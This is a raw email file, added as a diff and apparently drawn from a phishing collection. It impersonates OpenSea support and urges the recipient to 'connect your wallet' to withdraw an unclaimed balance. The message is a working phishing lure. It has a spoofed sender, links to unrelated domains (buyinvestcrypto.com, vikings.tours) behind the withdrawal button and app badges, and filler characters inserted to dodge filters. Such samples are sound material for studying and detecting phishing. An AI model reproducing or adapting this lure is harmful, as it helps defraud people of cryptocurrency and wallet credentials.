@@ -1,0 +1,421 @@
+From jose@monkey.org Sat Apr 27 22:28:53 2024 +0000
+Return-Path: opensea@sfr.fr
+Delivered-To: jose@monkey.org
+X-FDA: 82056752946.14.D48E96B
+Received: from nc-smtp1.sdv.fr (nc-smtp1.sdv.fr [212.95.69.91])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP id 8BBD7A000B
+	for <jose@monkey.org>; Sat, 27 Apr 2024 22:28:51 +0000 (UTC)
+Authentication-Results: imf12.b.hostedemail.com;
+	dkim=none;
+	spf=neutral (imf12.b.hostedemail.com: 212.95.69.91 is neither permitted nor denied by domain of opensea@sfr.fr) smtp.mailfrom=opensea@sfr.fr;
+	dmarc=fail reason="No valid SPF, No valid DKIM" header.from=sfr.fr (policy=none)
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1714256931; a=rsa-sha256;
+	cv=none;
+	b=1FEJIP3W/FEXGch1Ji0doo4zUAlmM9WOhwTw/TM3Ny47uCwDrDWrWlX7kF1398rsRHxapn
+	ZpYgOQ+0bVpiOFdCyuvmhbEKQ1mUaXAChAX+z/muP88ccybJf/iLxKW08aj1PC+jO8LqQs
+	GBu5EM1zGAEkDhXEIOrs7NvdPJU8uO8=
+ARC-Authentication-Results: i=1;
+	imf12.b.hostedemail.com;
+	dkim=none;
+	spf=neutral (imf12.b.hostedemail.com: 212.95.69.91 is neither permitted nor denied by domain of opensea@sfr.fr) smtp.mailfrom=opensea@sfr.fr;
+	dmarc=fail reason="No valid SPF, No valid DKIM" header.from=sfr.fr (policy=none)
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1714256931;
+	h=from:from:sender:reply-to:subject:subject:date:date:message-id:to:to:
+	 cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:in-reply-to:references;
+	bh=Pw5ljzgrHabOtYtObDyaRx87SkNTKUNTk0ucaHxlb1Q=;
+	b=8Tv4zsjNoKOhikx9GUHjG8vLQbSjSUmggPwc/EI+BLek8nHn+pMljminLkyiVEmoAT7qo2
+	dekqMc+jCGL5E9JifbQjRTIQ+GNPCpkXAcQ7bfseLqYDaNVJCwBUK2P/Vi0Be/70kPUFEo
+	KUotpetOEqH2TETQ9PsA72tJWtztKOE=
+Received: from EC2AMAZ-HL1Q5SN.us-west-2.compute.internal (100.6.202.77.rev.sfr.net [77.202.6.100])
+	by nc-smtp1.sdv.fr (Postfix) with ESMTPS id 3E22121453
+	for <jose@monkey.org>; Sun, 28 Apr 2024 00:28:47 +0200 (CEST)
+Content-Type: multipart/alternative; boundary="===============1910901648=="
+MIME-Version: 1.0
+Subject: =?utf-8?B?8J+UkSBBY2Nlc3MgWW91ciBORlRzIEZ1bmRzOiBDb25uZWN0IFdhbGxldCBOb3cgZm9yIFdpdGhkcmF3YWwhIPCfkrM=?=
+To: jose@monkey.org
+From: "OpenSea Support Team" <opensea@sfr.fr>
+Date: Sat, 27 Apr 2024 22:28:45 +0000
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: 8BBD7A000B
+X-Rspam-User: 
+X-Spam-Status: No, score=4.10
+X-Stat-Signature: qk5otssuh49ch1s6oquzkjhohsg7gxgz
+X-HE-Tag: 1714256931-875626
+X-HE-Meta: U2FsdGVkX1+Mjf24TPdFGTzCs6L6lrqZmonBwDdjdp2mAO1NTah6JKAWr/Mw6r3JT3jaT1TbLs28goeFG0JqnHZNHuEwAiVGhI+dT32h2jRWFJPrasLAZdoXc2dIm8W675CbY0x4fKRM9BqpDSYtFgKXD318sHoAHXjlBysfcqDPQXQllonMq6zMZArVqO4mFE1Ouo7cv9piwaRw6nIYBfETq5dtQka4F6s3waBKN9Z/J0OXb51MEXPgoeYp83WuoDT1UN0iKXfI/DCGoUgwUhlqVqkjhhHWyTXMNHgtaf7IDSnRb5HPxTz4a0D5EyCHYiXqevz6MEF+4+0L0NOt3rgg/lsx8VE/KX7nsbFGykK/pbpYv8Qn5vmm8virQkTcn+STnvxUP9CjYhnoUi2jqgXwYvMG/kobHAwhUa8zBjHOCHqH6gFlt30dwGP9jZ4wJsKfhntTUPRyaP/2e/QdntS1YtH+muuHqSi9JRHvzpw1C4DfwaHcDtY30RmBCirSwJI4cwpKbM6SGV7xmi7H7xWUatwbrEOuAXaBlU0Z7es3Lwth9bEPuE/6xkge/IkFHtFz7ALXhI11jIKWWtfHRL6aN3LPmeFz2rvtMr2A1t8hjysmqMzWlipx5Op9yxsuR/Rtynt4hhOBOz8uznEJfLkyN6FYvnraTSJqnFhReVTcNU549ivVjBe5pNpcxrzzWeEgR/NH3DyOHGKyhC8CFgCd2c/wd6PKnc/GT0YL0USFdTWIRcIpLN3sZExQV3EQ9F5DimiwaeKUgCL2jqndzhpkqFzmJiB+XWmQL3C7ghsBMeSI+oaZRhx1LMyJKD/rsLyMqq/y7QZ+Y9ydOlSjHFxcA6ttXiBz+MbL0ZGhmu0=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 126
+
+You will not see this in a MIME-aware mail reader.
+--===============1910901648==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+    =
+
+    =
+
+ =
+
+ 	 =
+
+   =
+
+    =
+
+    	 =
+
+   =
+
+Action Required: Connect Your Wallet to Withdraw Your OpenSea Balance
+  =
+
+ We hope this message finds you well. We are reaching out to remind you of =
+an unclaimed balance remaining in your OpenSea account associated with us. =
+To ensure you can access and withdraw these funds at your earliest convenie=
+nce, a connection of your digital wallet to your OpenSea account is require=
+d.
+ To connect your wallet and initiate the withdrawal process, please follow =
+these steps:
+        1. Log in to your OpenSea account.
+        2. Navigate to your account settings.
+        3. Select 'Wallet' and click on 'Connect Wallet'.
+        4. Follow the on-screen instructions to securely link your digital =
+wallet.
+ 	 =
+
+   	 =
+
+   Connect Wallet for Withdrawal  	 =
+
+   	 =
+
+   =
+
+    =
+
+    	 =
+
+  	 =
+
+   Should you need any assistance or have questions about this process, ple=
+ase do not hesitate to reach out to us directly. It is our priority to ensu=
+re a smooth and secure transaction for you.
+   Thank you for your prompt attention to this matter. We look forward to y=
+our action to finalize this process. Warm regards,
+ 	 =
+
+   2?2?8 P?a?r?k A?v?e S?o?u?t?h #?2201?4, N?e?w Y?o?r?k, N?Y 1?0?0?0?3
+ 	 =
+
+   Get the OpenSea app
+ 	 =
+
+   =
+
+   	 	 =
+
+   	 =
+
+   =
+
+   	 	 	 	 	 =
+
+   	 =
+
+   -2?0?1?8 - 2024 OpenSea
+ 	 =
+
+   	 =
+
+   	 =
+
+   	 =
+
+  =20
+--===============1910901648==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso=
+-8859-1"/>
+	<title></title>
+</head>
+<body>
+<table bgcolor=3D"#E5E8EB" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ role=3D"presentation" style=3D"table-layout: fixed; color: rgb(34, 34, 34)=
+; font-family: Inter, Helvetica, Arial; font-size: small; background-color:=
+ rgb(229, 232, 235); border-collapse: collapse !important;" width=3D"100%">
+	<tbody>
+		<tr>
+			<td align=3D"center" style=3D"margin: 0px; box-sizing: border-box !impor=
+tant; border-collapse: collapse;" valign=3D"top">
+			<table align=3D"center" bgcolor=3D"#feffff" border=3D"0" cellpadding=3D"=
+0" cellspacing=3D"0" role=3D"presentation" style=3D"table-layout: fixed; wi=
+dth: 540px; background-color: rgb(254, 255, 255); border-collapse: collapse=
+ !important;" width=3D"540">
+				<tbody>
+					<tr>
+						<td height=3D"20" style=3D"margin: 0px; border-collapse: collapse; he=
+ight: 20px; font-size: 20px; line-height: 20px; box-sizing: border-box !imp=
+ortant; text-align: center;">
+						<p><img alt=3D"" src=3D"https://d15k2d11r6t6rl.cloudfront.net/public/=
+users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85fe=
+a8d0a49bebde/editor_images/Header_logo.png" style=3D"width: 70px; height: 7=
+0px;" /></p>
+
+						<p><img alt=3D"" src=3D"https://miro.medium.com/v2/resize:fit:1400/1*=
+2WmEw9P9V3riUxXcFaGyZg.gif" style=3D"width: 500px; height: 250px;" /></p>
+						</td>
+					</tr>
+					<tr>
+						<td align=3D"center" style=3D"margin: 0px; box-sizing: border-box !im=
+portant; border-collapse: collapse;" valign=3D"top">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" role=3D"prese=
+ntation" style=3D"table-layout: fixed; width: 460px; border-collapse: colla=
+pse !important;" width=3D"460">
+							<tbody>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; box-sizing: border-box =
+!important; border-collapse: collapse;" valign=3D"top">
+									<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" role=3D"pr=
+esentation" style=3D"table-layout: fixed; width: 460px; border-collapse: co=
+llapse !important;" width=3D"460">
+										<tbody>
+											<tr>
+												<td align=3D"center" style=3D"margin: 0px; box-sizing: border-b=
+ox !important; border-collapse: collapse;" valign=3D"top">&nbsp;</td>
+											</tr>
+											<tr>
+												<td align=3D"left" style=3D"margin: 0px; border-collapse: colla=
+pse; padding: 30px 0px 0px; box-sizing: border-box !important;" valign=3D"t=
+op">
+												<h1 style=3D"font-family: Arial, sans-serif; color: noir;"><spa=
+n style=3D"font-size: 22px;"><span style=3D"font-family: Arial, Helvetica, =
+sans-serif;"><small>Action Required: Connect Your Wallet to Withdraw Your O=
+penSea Balance</small></span></span></h1>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;">&nbsp=
+;</p>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;">We ho=
+pe this message finds you well. We are reaching out to remind you of an unc=
+laimed balance remaining in your OpenSea account associated with us. To ens=
+ure you can access and withdraw these funds at your earliest convenience, a=
+ connection of your digital wallet to your OpenSea account is required.</p>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;"><stro=
+ng>To connect your wallet and initiate the withdrawal process, please follo=
+w these steps:</strong></p>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;">&nbsp=
+; &nbsp; &nbsp; &nbsp;1. Log in to your OpenSea account.</p>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;">&nbsp=
+; &nbsp; &nbsp; &nbsp;2. Navigate to your account settings.</p>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;">&nbsp=
+; &nbsp; &nbsp; &nbsp;3. Select &#39;Wallet&#39; and click on &#39;Connect =
+Wallet&#39;.</p>
+
+												<p style=3D"font-family: Arial, sans-serif; color: noir;">&nbsp=
+; &nbsp; &nbsp; &nbsp;4. Follow the on-screen instructions to securely link=
+ your digital wallet.</p>
+												</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td align=3D"left" style=3D"border-collapse:collapse;text-align:le=
+ft;padding:25px 0 10px;box-sizing:border-box!important" valign=3D"top">
+									<div><a href=3D"https://buyinvestcrypto.com/" style=3D"border-coll=
+apse:collapse;border:1px solid #feffff;background-color:#2e8dee;border-radi=
+us:12px;color:#feffff;display:inline-block;font-family:'Poppins',Helvetica,=
+Arial;font-size:18px;font-weight:600;padding:16px 0;text-align:center;text-=
+decoration:none;width:460px;box-sizing:border-box!important" target=3D"_bla=
+nk">Connect Wallet for Withdrawal </a></div>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+
+			<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ role=3D"presentation" style=3D"table-layout: fixed; width: 540px; border-c=
+ollapse: collapse !important;" width=3D"540">
+				<tbody>
+					<tr>
+						<td align=3D"center" style=3D"margin: 0px; box-sizing: border-box !im=
+portant; border-collapse: collapse; background-color: rgb(254, 255, 255);" =
+valign=3D"top">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" role=3D"prese=
+ntation" style=3D"table-layout: fixed; width: 460px; border-collapse: colla=
+pse !important;" width=3D"460">
+							<tbody>
+								<tr>
+									<td height=3D"40" style=3D"margin: 0px; box-sizing: border-box !im=
+portant; border-collapse: collapse; height: 40px; font-size: 0px; line-heig=
+ht: 0px;">&nbsp;</td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; border-collapse: collap=
+se; box-sizing: border-box ! important;" valign=3D"top"><img alt=3D"OpenSea=
+" border=3D"0" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.ne=
+t/public/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd=
+645da85fea8d0a49bebde/editor_images/Footer_logo.png" style=3D"border: 0px !=
+important; outline: none !important; width: 36px; max-width: 36px; display:=
+ block;" width=3D"36" /></td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; border-collapse: collap=
+se; padding-top: 15px; box-sizing: border-box !important;" valign=3D"top">
+									<p style=3D"font-size: 12px; line-height: 18px; color: rgb(17, 17,=
+ 17); margin: 0px; padding: 0px;">Should you need any assistance or have qu=
+estions about this process, please do not hesitate to reach out to us direc=
+tly. It is our priority to ensure a smooth and secure transaction for you.<=
+/p>
+									&nbsp;
+
+									<p style=3D"font-size: 12px; line-height: 18px; color: rgb(17, 17,=
+ 17); margin: 0px; padding: 0px;">Thank you for your prompt attention to th=
+is matter. We look forward to your action to finalize this process. Warm re=
+gards,</p>
+									</td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; border-collapse: collap=
+se; padding-top: 15px; box-sizing: border-box !important;" valign=3D"top">
+									<p style=3D"font-size: 12px; line-height: 18px; color: rgb(17, 17,=
+ 17); margin: 0px; padding: 0px;">2?2?8 P?a?r?k A?v?e S?o?u?t?h #?2201?4, N=
+?e?w Y?o?r?k, N?Y 1?0?0?0?3</p>
+									</td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; border-collapse: collap=
+se; padding-top: 35px; box-sizing: border-box !important;" valign=3D"top">
+									<p style=3D"font-size: 12px; line-height: 18px; font-weight: 700; =
+color: rgb(17, 17, 17); margin: 0px; padding: 0px;"><strong>Get the <span s=
+tyle=3D"border-collapse: collapse;">OpenSea</span> app</strong></p>
+									</td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; border-collapse: collap=
+se; padding-top: 15px; box-sizing: border-box !important;" valign=3D"top">
+									<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" role=3D"pr=
+esentation" style=3D"table-layout: fixed; border-collapse: collapse !import=
+ant;">
+										<tbody>
+											<tr>
+												<td align=3D"left" style=3D"margin: 0px; border-collapse: colla=
+pse; padding-right: 25px; box-sizing: border-box !important;" valign=3D"top=
+"><a href=3D"https://www.vikings.tours/readmes.html"><img alt=3D"iOS App St=
+ore" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.net/public/u=
+sers/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85fea=
+8d0a49bebde/editor_images/AppStore.png" style=3D"border: 0px !important; ou=
+tline: none !important; width: 120px; max-width: 120px; display: block;" />=
+</a></td>
+												<td align=3D"left" style=3D"margin: 0px; border-collapse: colla=
+pse; box-sizing: border-box !important;" valign=3D"top"><a href=3D"https://=
+www.vikings.tours/readmes.html"><img alt=3D"GooglePlay" data-bit=3D"iit" sr=
+c=3D"https://d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/669d571=
+3-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85fea8d0a49bebde/editor_image=
+s/GooglePlay.png" style=3D"border: 0px !important; outline: none ! importan=
+t; width: 135px; max-width: 135px; display: block;" /></a></td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; box-sizing: border-box =
+!important; border-collapse: collapse; padding: 30px 80px 0px 0px;" valign=
+=3D"top">
+									<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" role=3D"presentation" style=3D"table-layout: fixed; width: 380px; bo=
+rder-collapse: collapse !important;" width=3D"100%">
+										<tbody>
+											<tr>
+												<td align=3D"left" style=3D"margin: 0px; box-sizing:border-box =
+!important; border-collapse: collapse;" valign=3D"top"><img alt=3D"" border=
+=3D"0" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.net/public=
+/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85f=
+ea8d0a49bebde/editor_images/X.png" style=3D"border: 0px !important; outline=
+: none !important; width: 32px; max-width: 32px; display: block;" width=3D"=
+32" /></td>
+												<td align=3D"left" style=3D"margin: 0px; box-sizing: border-box=
+ !important; border-collapse: collapse;" valign=3D"top"><img alt=3D"" borde=
+r=3D"0" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.net/publi=
+c/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85=
+fea8d0a49bebde/editor_images/Instagram.png" style=3D"border: 0px !important=
+; outline: none !important; width: 32px; max-width: 32px; display: block;" =
+width=3D"32" /></td>
+												<td align=3D"left" style=3D"margin: 0px; box-sizing: border-box=
+ !important; border-collapse: collapse;" valign=3D"top"><img alt=3D"" borde=
+r=3D"0" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.net/publi=
+c/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85=
+fea8d0a49bebde/editor_images/Discord.png" style=3D"border: 0px !important; =
+outline: none !important; width: 32px; max-width: 32px; display: block;" wi=
+dth=3D"32" /></td>
+												<td align=3D"left" style=3D"margin: 0px; box-sizing: border-box=
+ !important; border-collapse: collapse;" valign=3D"top"><img alt=3D"" borde=
+r=3D"0" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.net/publi=
+c/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85=
+fea8d0a49bebde/editor_images/Twitch281%29.png" style=3D"border: 0px !import=
+ant; outline: none !important; width: 32px; max-width: 32px; display:block;=
+" width=3D"32" /></td>
+												<td align=3D"left" style=3D"margin: 0px; box-sizing: border-box=
+ !important; border-collapse: collapse;" valign=3D"top"><img alt=3D"" borde=
+r=3D"0" data-bit=3D"iit" src=3D"https://d15k2d11r6t6rl.cloudfront.net/publi=
+c/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645da85=
+fea8d0a49bebde/editor_images/YouTube281%29.png" style=3D"border: 0px !impor=
+tant; outline: none !important; width: 32px; max-width: 32px; display: bloc=
+k;" width=3D"32" /></td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td align=3D"center" style=3D"margin: 0px; border-collapse: collap=
+se; padding: 25px 0px 0px; box-sizing: border-box !important;" valign=3D"to=
+p">
+									<p style=3D"font-size: 12px; line-height: 18px; color: rgb(17, 17,=
+ 17); margin: 0px; padding: 0px;">&copy;2?0?1?8 - 2024 <span style=3D"borde=
+r-collapse: collapse;">OpenSea</span></p>
+									</td>
+								</tr>
+								<tr>
+									<td height=3D"40" style=3D"margin: 0px; box-sizing: border-box ! i=
+mportant; border-collapse: collapse; height: 40px; font-size: 0px; line-hei=
+ght: 0px;">&nbsp;</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+	</tbody>
+</table>
+</body>
+</html>
+
+--===============1910901648==--
